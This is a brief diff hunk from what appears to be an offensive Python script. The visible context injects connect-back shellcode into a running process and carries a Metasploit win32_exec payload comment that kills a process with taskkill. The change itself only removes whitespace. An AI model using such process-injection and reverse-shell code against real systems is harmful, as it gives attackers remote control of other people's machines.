@@ -86,8 +86,7 @@ connect_back_shellcode = \
 
 inject( pid, connect_back_shellcode )
 
-
-#/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA 
+#/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA
 #Size=159 Encoder=None http://metasploit.com */
 our_pid = str( kernel32.GetCurrentProcessId() )
 
